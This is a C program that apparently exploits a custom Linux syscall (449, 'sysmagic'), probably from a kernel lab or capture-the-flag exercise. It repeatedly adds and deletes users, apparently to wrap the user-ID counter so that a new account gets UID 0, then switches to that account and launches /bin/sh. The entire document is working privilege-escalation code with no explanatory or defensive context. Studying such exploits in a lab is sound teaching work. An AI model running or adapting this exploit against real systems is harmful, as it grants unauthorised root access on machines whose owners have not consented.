#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>

int main(int argc, char *argv[]) {
    printf("Hi there, let's call this syscall bruv!\n");
    long ret;

   for(int i=0; i<65534; i++) {
       char user[64];
       sprintf(user, "luser%d", i);

       //call to add user
       ret = syscall(449, 0, user, "testpass");
       if(ret < 0) {
           printf("i value: %d\n", i);
           fprintf(stderr, "sysmagic add: %m\n");
           break;
       }

       ret = syscall(449, 2, user, "testpass");
       if(ret < 0) {
           printf("i value: %d\n", i);
           fprintf(stderr, "sysmagic delete: %m\n");
           break;
       }
   }

   //add overlap user uid: 0
   ret = syscall(449, 0, "muffinman", "muffpass");
   if(ret < 0) {
       fprintf(stderr, "OUIIII: %m\n");
       return -1;
   }

   //add penultimate user
   ret = syscall(449, 0, "penuser", "penpass");
   if(ret < 0) {
       fprintf(stderr, "OUIIII: %m\n");
       return -1;
   }


   //add final user to switch from
   ret = syscall(449, 0, "finaluser", "finalpass");
   if(ret < 0) {
       fprintf(stderr, "final user fail: %m\n");
       return -1;
   }

   //switch to overlap user
   ret = syscall(449, 3, "muffinman", "muffpass");
   if (ret < 0) {
       fprintf(stderr, "switch failed: %m\n");
   } else if (ret == 0) {
       fprintf(stderr, "existing user\n");
   }

    system("/bin/sh");
   
   return 0;
}
